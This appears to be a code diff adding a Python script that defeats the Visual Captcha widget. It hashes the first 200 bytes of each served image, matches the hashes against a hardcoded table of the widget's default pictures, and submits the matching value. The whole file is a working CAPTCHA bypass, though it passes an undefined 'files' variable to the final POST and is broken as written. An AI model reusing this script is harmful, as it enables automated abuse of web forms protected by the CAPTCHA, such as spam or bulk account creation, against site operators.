@@ -1,0 +1,98 @@
+#!/usr/bin/env python3
+
+import random
+import string
+import requests
+import sys
+import json
+from hashlib import md5
+import subprocess
+
+# All the images Visual Captcha uses by default. 
+#
+# These are MD5 hashes of the first 200 bytes of each image, because it looks 
+# like the images we're sent are appended with garbage at the end. Probably to
+# stop this kind of thing. Doesn't matter though, since hashes of the first 200 
+# bytes are unique anyway. Silly.
+hashes = { 
+  "a701a10d860ec38b91d6f7ad2d431963": "airplane",
+  "fb2159f0ced4aa6b2713c3a1a040dadc": "balloons",
+  "5007e00ca107a330e45c9543261a8c01": "camera",
+  "13483a2e9193dca6d2a7c1a284d091fb": "car",
+  "f571531be8340aaa775baea1fa2e1ba6": "cat",
+  "725673cc5fc50ccfdb8d953dbf0c7e10": "chair",
+  "4f68bef0627fb061eee9940a74c57468": "clip",
+  "76a28dbdc2790adf2ab56000d6850364": "clock",
+  "3baa329701836ad257ef8c093f311806": "cloud",
+  "88db773475881d8ed232ae89982146d1": "computer",
+  "ba8483f35351d3183206a76a21d2c154": "envelope",
+  "0e4f6095f1720c08028f24cf28b10739": "eye",
+  "10aaceb337e8ec6c9891c978f1e8541e": "flag",
+  "4563a72619474d8219ed897671bb9ed1": "folder",
+  "9cfdee468ff8d6a6d3b677df934ef022": "foot",
+  "a44e4f5409b9656c3726f379180ce4fb": "graph",
+  "d59b3d1ed5d5b3eb1e6c8cb58391352f": "house",
+  "662bd8daefffe4d5a32da430cd3d576c": "key",
+  "93a655412f416f506d8c8333c7f3f661": "leaf",
+  "cc14eeaf4563d17a582cf0cba1500490": "light bulb",
+  "e6b6e8767128619d5774671454cc6d72": "lock",
+  "1137ad58d39978e201283c708623ea2a": "magnifying glass",
+  "675ca00448f317e97528354daa9723b5": "man",
+  "2973b7e3bd22bb9846d788688b382933": "music note",
+  "6bd66bbc19b2ad6343906f0bcbaa10d1": "pants",
+  "947bd0999de58eecc68cef7351dc9962": "pencil",
+  "3fe39d5ec51fde0553f4aa693035de7d": "printer",
+  "15fdafd082a1db0a98c3eac98b578d4c": "robot",
+  "b13f9417fa6fd86f91f2705ba77f72ef": "scissors",
+  "5956def1d288738cc18f654506774c8a": "sunglasses",
+  "a46ca46f42478bac984c19e95bbbad01": "tag",
+  "2313255b96c5f1f2cd4aadc20df50d81": "tree",
+  "6a69fe791743d6162f2fe94918371601": "truck",
+  "b7d96724381af9989e7ccb2463cd2659": "t-shirt",
+  "264220390cc01f6519f3c71c20a2e2ae": "umbrella",
+  "fb7387f0bb3f9cfa9a7177474e2deb6b": "woman",
+  "1cb01d1c8bb0cbb41c405ff5984bf98e": "world"
+}
+
+base_url = "http://example.com"
+page_url = "%s/form" % base_url
+ajax_url = base_url
+
+# a random string
+r = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))
+
+session = requests.Session()
+
+print("Requesting initial page to set up a session")
+session.get(page_url)
+
+print("Requesting CAPTCHA images")
+data = json.loads(session.get("%s/start/5" % ajax_url).content.decode("utf-8"))
+
+image_field_name = data['imageFieldName']
+their_image_name = data['imageName'].lower()
+values = data['values'];
+
+print("Looks like we want to choose the %s. Let's find it..." % their_image_name)
+
+postdata = {}
+
+for index in range(len(values)):
+  image_data = session.get("%s/image/%s" % (ajax_url, index)).content[0:200]
+  hash = md5(image_data).hexdigest()
+  our_image_name = hashes[hash];
+  print("Found %s: %s" % (hash, our_image_name))
+
+  if our_image_name == their_image_name:
+    print("Found it at index %d!" % index)
+    value = values[index]
+    print("Passing %s => %s as POST value" % (image_field_name, value))
+    postdata[image_field_name] = value
+    break
+
+result = session.post(page_url, data=postdata, files=files).content
+
+# Debugging
+# open("/tmp/test.html", "wb").write(result)
+# subprocess.call(['xdg-open', '/tmp/test.html'])
+
